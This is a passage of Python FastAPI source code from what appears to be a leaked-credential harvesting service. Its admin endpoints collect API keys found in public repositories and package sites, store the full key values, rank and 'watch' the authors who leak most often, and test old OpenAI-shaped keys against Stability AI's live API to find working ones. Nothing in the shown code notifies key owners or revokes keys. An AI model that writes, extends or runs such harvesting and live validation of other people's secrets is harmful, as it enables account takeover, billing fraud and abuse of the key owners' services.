        global _AUTHOR_CYCLE_RUNNING, _AUTHOR_CYCLE_LAST_RESULT
        _AUTHOR_CYCLE_RUNNING = True
        try:
            _AUTHOR_CYCLE_LAST_RESULT = await run_author_cycle()
        except Exception as e:
            log.error("manual author cycle err: %s", e)
            _AUTHOR_CYCLE_LAST_RESULT = {"error": str(e)}
        finally:
            _AUTHOR_CYCLE_RUNNING = False

    asyncio.create_task(_bg(), name="manual_author_cycle")
    return {"ok": True, "message": "cycle started in background — poll /admin/author_cycle_status"}


@app.get("/admin/author_cycle_status")
async def admin_author_cycle_status(
    authorization: str | None = Header(default=None),
):
    _check_admin(authorization)
    return {
        "running":     _AUTHOR_CYCLE_RUNNING,
        "last_result": _AUTHOR_CYCLE_LAST_RESULT,
    }


@app.post("/admin/backfill_authors")
async def admin_backfill_authors(
    authorization: str | None = Header(default=None),
):
    """One-time backfill: populate watched_authors from existing found_keys.

    track_leak() only auto-fires on NEW save_key() inserts. Pre-existing
    rows from before that hook was added have no entry in watched_authors.
    This endpoint scans found_keys and aggregates per-author counters,
    auto-promoting any author with leak_count >= 3 to is_watched=1.

    Idempotent: re-running overwrites the rebuilt aggregate.
    """
    _check_admin(authorization)
    import sqlite3
    with sqlite3.connect(DB_PATH) as conn:
        conn.row_factory = sqlite3.Row
        # Clear existing aggregates so re-running is idempotent.
        conn.execute("DELETE FROM watched_authors")
        # Aggregate from found_keys. Skip non-github platform prefixes
        # (postman:/kaggle:/etc) — those have separate `<platform>:<owner>`
        # repo formats and need different parsing logic.
        conn.execute("""
            INSERT INTO watched_authors
                (login, platform, leak_count, valid_count, repos_with_leaks,
                 first_leak_at, last_leak_at, is_watched)
            SELECT
                SUBSTR(repo, 1, INSTR(repo, '/') - 1)         AS login,
                'github'                                      AS platform,
                COUNT(*)                                      AS leak_count,
                COALESCE(SUM(is_valid), 0)                    AS valid_count,
                COUNT(DISTINCT repo)                          AS repos_with_leaks,
                MIN(discovered_at)                            AS first_leak_at,
                MAX(discovered_at)                            AS last_leak_at,
                CASE WHEN COUNT(*) >= 3 THEN 1 ELSE 0 END     AS is_watched
            FROM found_keys
            WHERE repo LIKE '%/%'
              AND repo NOT LIKE 'postman:%'
              AND repo NOT LIKE 'kaggle:%'
              AND repo NOT LIKE 'hf:%'
              AND repo NOT LIKE 'npm:%'
              AND repo NOT LIKE 'pypi:%'
              AND repo NOT LIKE 'cc:%'
              AND repo NOT LIKE 'http%://%'  -- skip URL-style repo strings
              AND repo NOT LIKE 'https:%'
              AND INSTR(repo, '/') > 0
            GROUP BY login, platform
        """)
        # Counts after backfill
        total = conn.execute("SELECT COUNT(*) FROM watched_authors").fetchone()[0]
        watched = conn.execute(
            "SELECT COUNT(*) FROM watched_authors WHERE is_watched=1"
        ).fetchone()[0]
        top = [dict(r) for r in conn.execute("""
            SELECT login, leak_count, valid_count, repos_with_leaks
            FROM watched_authors
            WHERE is_watched=1
            ORDER BY valid_count DESC, leak_count DESC
            LIMIT 10
        """).fetchall() ]
    return {
        "ok": True,
        "total_authors":  total,
        "watched_count":  watched,
        "top_10_watched": top,
    }


@app.post("/admin/backfill_stability")
async def admin_backfill_stability(
    only_dead: bool = True,
    limit: int = 500,
    authorization: str | None = Header(default=None),
):
    """One-time backfill: reclassify openai-classified 48-char keys to
    Stability when they validate against Stability API.

    Background: pre-2026-05, our extract_openai matched `sk-[A-Za-z0-9]{48}`
    without disambiguating from Stability AI keys (same shape). Many old
    rows tagged provider=openai is_valid=0 are actually live Stability
    keys that were never validated against the Stability endpoint.

    For each candidate row:
      1. Probe https://api.stability.ai/v1/user/account with the key
      2. If 200 → reclassify provider=stability, is_valid=1, stamp
         last_validated_at
      3. If non-200 → leave row alone
    """
    _check_admin(authorization)
    import sqlite3
    import re as _re
    from validators import validate_stability
    pat48 = _re.compile(r'^sk-[A-Za-z0-9]{48}$')
    where_dead = "AND is_valid=0" if only_dead else ""
    with sqlite3.connect(DB_PATH) as conn:
        conn.row_factory = sqlite3.Row
        rows = conn.execute(
            f"""SELECT id, key_hash, key_full FROM found_keys
                WHERE provider='openai' {where_dead}
                LIMIT ?""",
            (limit,),
        ).fetchall()
    candidates = [r for r in rows if pat48.match(r["key_full"])]
    reclassified = 0
    skipped = 0
    for row in candidates:
        try:
            if await validate_stability(row["key_full"]):
                with sqlite3.connect(DB_PATH) as conn:
                    conn.execute(
                        """UPDATE found_keys
                           SET provider='stability',
                               is_valid=1,
                               last_validated_at=?
                           WHERE id=?""",
                        (datetime.now(timezone.utc).isoformat(), row["id"]),
                    )
                reclassified += 1
                log.info("[backfill_stability] reclassified id=%s as stability VALID",
                         row["id"])
            else:
                skipped += 1
        except Exception as e:
            log.debug("backfill_stability err id=%s: %s", row["id"], e)
            skipped += 1
    return {
        "ok": True,
        "checked": len(candidates),
        "reclassified": reclassified,
        "skipped_or_failed": skipped,
        "message": f"Reclassified {reclassified} keys from openai → stability",
    }
